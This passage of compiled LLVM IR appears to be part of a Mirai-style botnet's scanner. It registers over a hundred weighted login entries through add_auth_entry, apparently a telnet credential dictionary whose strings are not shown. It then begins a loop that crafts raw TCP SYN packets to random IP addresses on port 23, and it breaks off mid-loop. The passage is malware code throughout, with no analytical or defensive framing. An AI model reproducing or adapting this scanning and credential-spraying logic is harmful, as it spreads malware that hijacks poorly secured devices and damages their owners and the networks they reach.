  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.29, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.31, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.32, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.34, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.39, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.41, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.42, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.44, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.45, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.48, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.49, i32 0, i32 0), i16 zeroext 16)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.50, i32 0, i32 0), i16 zeroext 16)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.53, i32 0, i32 0), i16 zeroext 17)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i32 0, i32 0), i16 zeroext 9)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.21, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.59, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.61, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.62, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.70, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.72, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.73, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.74, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.75, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.76, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.77, i32 0, i32 0), i16 zeroext 8)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.78, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.75, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 12)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.80, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.61, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.81, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.82, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.83, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.84, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.85, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.88, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.89, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.90, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i16 zeroext 6)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.92, i32 0, i32 0), i16 zeroext 4)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.93, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.94, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.32, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.95, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.96, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.22, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.97, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.99, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.101, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i16 zeroext 1)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i16 zeroext 2)
  call void @add_auth_entry(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i32 0, i32 0), i16 zeroext 15)
  call void @add_auth_entry(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.104, i32 0, i32 0), i16 zeroext 1)
  br label %239

; <label>:239:                                    ; preds = %1325, %130
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %240 = load i32, i32* @fake_time, align 4
  %241 = load i32, i32* %13, align 4
  %242 = icmp ne i32 %240, %241
  br i1 %242, label %243, label %309

; <label>:243:                                    ; preds = %239
  %244 = load i32, i32* @fake_time, align 4
  store i32 %244, i32* %13, align 4
  store i32 0, i32* %1, align 4
  br label %245

; <label>:245:                                    ; preds = %303, %243
  %246 = load i32, i32* %1, align 4
  %247 = icmp slt i32 %246, 760
  br i1 %247, label %248, label %308

; <label>:248:                                    ; preds = %245
  %249 = bitcast %struct.sockaddr_in* %17 to i8*
  call void @llvm.memset.p0i8.i64(i8* %249, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %18, align 8
  %250 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %251 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %250, i64 1
  %252 = bitcast %struct.iphdr* %251 to %struct.tcphdr*
  store %struct.tcphdr* %252, %struct.tcphdr** %19, align 8
  %253 = call i32 @rand_next()
  %254 = trunc i32 %253 to i16
  %255 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %256 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %255, i32 0, i32 3
  store i16 %254, i16* %256, align 4
  %257 = load i32, i32* @LOCAL_ADDR, align 4
  %258 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %259 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %258, i32 0, i32 8
  store i32 %257, i32* %259, align 4
  %260 = call i32 @get_random_ip()
  %261 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %262 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %261, i32 0, i32 9
  store i32 %260, i32* %262, align 4
  %263 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i32 0, i32 7
  store i16 0, i16* %264, align 2
  %265 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %266 = bitcast %struct.iphdr* %265 to i16*
  %267 = call zeroext i16 @checksum_generic(i16* %266, i32 20)
  %268 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %269 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %268, i32 0, i32 7
  store i16 %267, i16* %269, align 2
  %270 = call zeroext i16 @htons(i16 zeroext 23) #9
  %271 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 1
  store i16 %270, i16* %272, align 2
  %273 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %274 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %273, i32 0, i32 9
  %275 = load i32, i32* %274, align 4
  %276 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %277 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %276, i32 0, i32 2
  store i32 %275, i32* %277, align 4
  %278 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 6
  store i16 0, i16* %279, align 4
  %280 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %281 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %282 = bitcast %struct.tcphdr* %281 to i8*
  %283 = call zeroext i16 @htons(i16 zeroext 20) #9
  %284 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %280, i8* %282, i16 zeroext %283, i32 20)
  %285 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %286 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %285, i32 0, i32 6
  store i16 %284, i16* %286, align 4
  %287 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %287, align 4
  %288 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 9
  %290 = load i32, i32* %289, align 4
  %291 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %292 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %291, i32 0, i32 0
  store i32 %290, i32* %292, align 4
  %293 = load %struct.tcphdr*, %struct.tcphdr** %19, align 8
  %294 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %293, i32 0, i32 1
  %295 = load i16, i16* %294, align 2
  %296 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %295, i16* %296, align 2
  %297 = load i32, i32* @rsck, align 4
  %298 = bitcast %union.__SOCKADDR_ARG* %20 to %struct.sockaddr**
  %299 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %299, %struct.sockaddr** %298, align 8
  %300 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %20, i32 0, i32 0
  %301 = load %struct.sockaddr*, %struct.sockaddr** %300, align 8
